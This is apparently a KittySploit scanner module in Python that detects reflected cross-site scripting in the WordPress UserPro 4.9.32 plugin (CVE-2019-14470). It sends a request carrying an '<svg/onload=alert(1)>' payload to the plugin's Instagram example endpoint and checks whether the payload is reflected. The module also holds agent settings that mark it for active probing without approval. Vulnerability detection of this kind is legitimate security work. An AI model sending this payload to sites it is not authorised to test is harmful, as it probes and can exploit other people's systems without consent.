#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress UserPro 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress UserPro 4.9.32 - Cross-Site Scripting Detection',
        'description': 'WordPress UserPro 4.9.32 is vulnerable to reflected cross-site scripting because the Instagram PHP API (v2) it relies on allows it via the example/success.php error_description parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'xss', 'wp-plugin', 'wpscan', 'packetstorm', 'instagram-php-api_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/9815',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14470',
            'http://packetstormsecurity.com/files/154206/WordPress-UserPro-4.9.32-Cross-Site-Scripting.html',
            'https://wpvulndb.com/vulnerabilities/9815',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-14470',
        ],
        'cve': 'CVE-2019-14470',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/userpro/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=%3Csvg/onload=alert(1)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<svg/onload=alert(1)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress UserPro 4.9.32 - Cross-Site Scripting detected', path=path)
            return True
        return False

